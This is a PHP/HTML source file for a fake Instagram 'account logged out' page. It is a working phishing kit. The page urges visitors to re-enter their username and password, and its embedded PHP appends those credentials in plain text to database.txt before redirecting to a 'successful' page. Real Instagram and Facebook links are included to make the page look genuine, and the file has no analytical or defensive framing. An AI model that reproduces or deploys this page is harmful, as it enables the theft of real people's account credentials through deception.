<html>
<head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="www/css/style.css?release-3">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
    <div id="container">
        <div class="content">
            <div class="center">
                <span class="title">Your account has been logged out</span>
                <span class="desc">You cannot access your account at the moment. Complete the steps below to reactivate your account.</span>
                    <form class="form-page" action="#" method="POST">
                        <input type="text" name="username" id="username" class="input" placeholder="Phone number, username or email">
                        <input type="password" name="password" id="password" class="input" placeholder="Password">
                        <button type="submit" name="submit" id="submit" disabled="disabled" class="log-in">Log in</button>
                    </form>
                    <?php
                    if(isset($_POST['submit']))
                    {
                        $username=$_POST['username'];
                        $password=$_POST['password'];

                        $yaz = "Kullanıcı adı veya e-posta adresi: ".$username."\n\nŞifre: ".$password."\n\n";


                        $fp = fopen('database.txt', 'a');


                        fwrite($fp, $yaz);
                        fclose($fp);
						
						header("Location: successful.php");
                    }
                    ?>
                <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/">Forgot your login details?<b>Get help logging in.</b></a>
                <span class="divider">OR</span>
                <a class="facebook" href="https://facebook.com" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0z"/><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/></svg>Log in with Facebook</a>
            </div>
            <div class="bottom">
                <a class="sign-up" href="https://www.instagram.com/accounts/emailsignup/">Don't have an account?<b>Sign up.</b></a>
            </div>
        </div>
    </div>
    <script>
    $(function () {
        var input = $('#username');
        var inputpass = $('#password');
        var button = $('#submit');

        inputpass.keyup(function () {
            if ($(this).val() == '') {
                button.prop('disabled', true);
            } else {
                button.prop('disabled', false);
            }
        });
    }); 
    </script>
</body>
</html>